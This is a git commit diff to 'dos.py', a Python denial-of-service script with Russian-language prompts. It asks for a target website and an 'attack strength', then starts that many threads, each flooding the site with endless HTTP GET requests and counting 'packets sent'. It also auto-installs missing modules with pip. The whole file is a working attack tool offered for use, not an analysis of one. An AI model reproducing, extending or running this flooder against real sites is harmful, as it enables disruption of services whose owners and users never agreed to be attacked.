2699dc759312c18d3c3c67a655cd70df71c0d25c
IAmEatingAnApple <70452799+IAmEatingAnApple@users.noreply.github.com>
2020-10-15 16:54:20 +0300

    Add files via upload

--- dos.py
+++ dos.py
@@ -1,18 +1,48 @@
-print("Инициализация...")
-import requests
-from colorama import Fore, Style, Back
 from os import system
-system("clear")
-site = input(Back.RED + Fore.BLACK + "Введите сайт: ")
-print(Style.RESET_ALL)
-i = 1
-print("Атака начинается...")
-while True:
-	try:
-		response = requests.get(f"http://{site}").text
-		print(Fore.YELLOW + response)
-		print(Fore.GREEN + f"Пакет послан {i}")
-		print(Style.RESET_ALL)
-		i = i + 1
-	except ConnectionError:
-		print("Такого сайта нет")
+try:
+	print("Инициализация...")
+	import requests, webbrowser
+	from colorama import Fore, Style, Back
+	import threading
+
+	def attack(n, name):
+		i = 1	
+		while True:
+			try:
+				response = requests.get(f"{site2}").text
+				print(Fore.YELLOW + response)
+				print(Fore.GREEN + f"Пакет послан {i}")
+				print(Style.RESET_ALL)
+				i = i + 1
+			except requests.exceptions.ConnectionError:
+				print(Fore.RED + "Такого сайта нет" + Style.RESET_ALL)
+				exit()
+
+
+	thread_list=[]
+
+	system("clear")
+	system("cls")
+	site = input(Back.RED + Fore.BLACK + "Введите сайт: ")
+	site2 = f"http://{site}"
+	print(Style.RESET_ALL)
+	op = input("Открыть атакуемый сайт? y/n: ")
+	force = int(input("Введите силу аттаки: "))
+	if op == "n" or op == "N":
+		print("Атака начинается...")
+		for i in range(force):
+			t = threading.Thread(target=attack, args=(5,'Thread1'))
+			thread_list.append(t)
+			t.start()
+	if op == "y" or op == "Y":
+		print("Атака начинается...")
+		webbrowser.open(site2)
+		for i in range(force):
+			t = threading.Thread(target=attack, args=(5,'Thread1'))
+			thread_list.append(t)
+			t.start()
+except ModuleNotFoundError:
+	print("Не найдены необходимые для работы модули. Устанавливаю их...")
+	system("pip install colorama")
+	system("pip install requests")
+	system("python dos.py")
